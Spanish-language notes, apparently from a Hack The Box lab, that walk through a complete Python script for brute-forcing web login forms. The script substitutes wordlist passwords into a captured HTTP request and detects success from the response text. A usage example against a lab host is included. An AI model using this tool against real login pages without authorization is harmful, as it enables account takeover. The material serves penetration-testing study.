Este script es un **fuzzer** que realiza ataques de fuerza bruta a formularios web. **Sustituye una marca específica en la solicitud (`MARKER`) por cada palabra de un diccionario y envía la solicitud modificada al servidor.** Luego, analiza las respuestas para detectar intentos exitosos.
_________
# Explicacion del codigo

```python
import requests
import argparse
```

📌 **Importaciones:**

- `requests`: Para enviar peticiones HTTP.
- `argparse`: Para manejar argumentos en la línea de comandos.

_____________________

```python
def parse_request(request_template):
    lines = request_template.strip().split("\n")
    method, path, _ = lines[0].split(" ")

```

📌 **Función `parse_request(request_template)`**

- **Divide la solicitud en líneas** (`strip().split("\n")`).
- **Extrae el método HTTP y la ruta** de la primera línea (`POST /login/ HTTP/1.1` → `POST`, `/login/`).

_____________________

```python
    headers = {}
    body = ""
    is_body = False
```

📌 **Inicializa variables:**

- `headers`: Para almacenar los encabezados HTTP.
- `body`: Para el contenido de la solicitud.
- `is_body`: Un indicador para saber cuándo hemos alcanzado el cuerpo de la solicitud.

_____________________

```python
    for line in lines[1:]:
        if line == "":
            is_body = True
            continue
```

📌 **Detecta cuándo empieza el cuerpo del request:**

- En HTTP, hay una línea en blanco que separa los **headers** del **cuerpo**.
- Cuando encuentra una línea vacía (`""`), **activa `is_body` para empezar a leer el cuerpo** en las siguientes líneas.

_____________________

```python
        if is_body:
            body += line + "\n"
        else:
            key, value = line.split(": ", 1)
            headers[key] = value
```

📌 **Procesa los encabezados y el cuerpo:**

- **Si `is_body` es `True`**, la línea se agrega al `body` (contenido del formulario).
- **Si `is_body` es `False`**, la línea es un encabezado HTTP y se almacena en el diccionario `headers`.

_____________________

```python
    return method, path, headers, body.strip()
```

📌 **Devuelve los datos extraídos:**

- **Método HTTP (POST, GET, etc.)**.
- **Ruta** (`/login/`).
- **Encabezados HTTP** (diccionario con claves y valores).
- **Cuerpo de la solicitud**, limpiando espacios extra.

_____________________

```python
def fuzz_request(request_template, wordlist_path, placeholder, url):
    method, path, headers, body = parse_request(request_template)
```

📌 **Función `fuzz_request(request_template, wordlist_path, placeholder, url)`**

- Llama a `parse_request()` para extraer los detalles de la solicitud.

_____________________

```python
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        wordlist = [line.strip() for line in f]
```

📌 **Carga la lista de palabras (`wordlist`)**

- Abre el diccionario (`wordlist_path`) y lee cada línea.
- `strip()` elimina espacios o saltos de línea.
- `errors="ignore"` evita problemas con caracteres inválidos.

_____________________

```python
    for word in wordlist:
        modified_body = body.replace(placeholder, word)
```

📌 **Fuerza bruta con cada palabra de `wordlist`**

- **Reemplaza `MARKER` por la palabra del diccionario**.
- Así, `password=MARKER` se convierte en `password=123456`, `password=letmein`, etc.

_____________________

```python
        response = requests.request(method, url, headers=headers, data=modified_body, allow_redirects=False)
```

📌 **Envía la solicitud modificada**

- Usa `requests.request()` con:
    - Método (`POST`).
    - URL de destino.
    - Encabezados HTTP.
    - Cuerpo con la contraseña sustituida.
    - `allow_redirects=False`: Para evitar redirecciones automáticas.

_____________________

```python
        print(f"[*] Probando: {word} -> Código HTTP: {response.status_code}")
```

📌 **Muestra el intento en pantalla**

- Informa qué palabra se está probando y qué código de estado devuelve el servidor (200, 403, 500, etc.).

_____________________

```python
        if "Invalid" not in response.text and "incorrect" not in response.text:
            print(f"[+] ¡Contraseña encontrada!: {word}")
            break
```

📌 **Detecta éxito**

- Si la respuesta **no contiene "Invalid" o "incorrect"**, se asume que el inicio de sesión fue exitoso.
- **Muestra la contraseña correcta y detiene el ataque (`break`)**.

_____________________

```python
def main():
    parser = argparse.ArgumentParser(description="Herramienta de fuerza bruta HTTP.")
    parser.add_argument("-r", "--request", required=True, help="Archivo con la plantilla de la solicitud.")
    parser.add_argument("-w", "--wordlist", required=True, help="Lista de contraseñas.")
    parser.add_argument("-p", "--placeholder", required=True, help="Texto a reemplazar en la solicitud (ej: MARKER).")
    parser.add_argument("-u", "--url", required=True, help="URL de destino.")

    args = parser.parse_args()
```

📌 **Función `main()`**

- Define los argumentos de la línea de comandos:
    - `-r`: Archivo con la solicitud (`request.txt`).
    - `-w`: Lista de contraseñas (`rockyou.txt`).
    - `-p`: Marcador a reemplazar (`MARKER`).
    - `-u`: URL del formulario.

_____________________

```python
    with open(args.request, "r", encoding="utf-8") as f:
        request_template = f.read()
```

📌 **Lee la plantilla de solicitud (`request.txt`)**

- Se almacena en `request_template`.

_____________________

```python
    fuzz_request(request_template, args.wordlist, args.placeholder, args.url)
```

📌 **Llama a `fuzz_request()` con los parámetros de usuario**

- Ejecuta el ataque de fuerza bruta con la configuración elegida.

_____________________

```python
if __name__ == "__main__":
    main()
```

📌 **Ejecución del script**

- Si el script se ejecuta directamente, llama a `main()`.

_____________________

# Ejemplo de uso

```python
python3 intruder.py -r request.txt -w rockyou_utf8.txt -p MARKER -u http://magicgardens.htb/admin/login/?next=/admin/
```

![[Pasted image 20250205175733.png]]

_(En esta ocasión, el código fue alterado para que se detuviera cuando la respuesta devolviera un código de estado 302, ya que ese era el objetivo)_